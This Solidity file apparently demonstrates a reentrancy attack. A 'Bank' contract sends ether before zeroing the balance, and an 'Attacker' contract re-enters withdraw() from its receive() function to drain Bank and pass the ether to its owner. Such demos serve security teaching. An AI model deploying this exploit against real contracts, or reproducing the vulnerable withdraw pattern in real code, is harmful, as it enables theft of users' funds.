// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

contract Bank {
    
    mapping(address => uint) public balances;


    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {

        uint currentBalance = balances[msg.sender]; 
        (bool result,) = msg.sender.call{value:currentBalance}("");
        require(result, "ERROR");
        balances[msg.sender] = 0;     

    }
    
    function chekcBalance() external view returns(uint) {
        return address(this).balance;
    }
    
}

contract Attacker {

    event Info(string info);
    Bank public bank;
    address public owner;
    receive() payable external {
        if(address(msg.sender).balance>0) { // 6 ether
            bank.withdraw();
        }else{
            emit Info("Thank you for your ether :)");
        }
    }

    constructor(address _bank, address _owner) {
        bank = Bank(_bank);
        owner = _owner;
    }

    function sendEther() external payable {
        bank.deposit{value:msg.value}();
    }

    function withdrawEther() external {
        bank.withdraw();
    }

    function chekcBalance() external view returns(uint) {
        return address(this).balance;
    }

    function giveMeEther() external {
        (bool result,) = owner.call{value:address(this).balance}("");
        require(result,"ERROR");
    }

}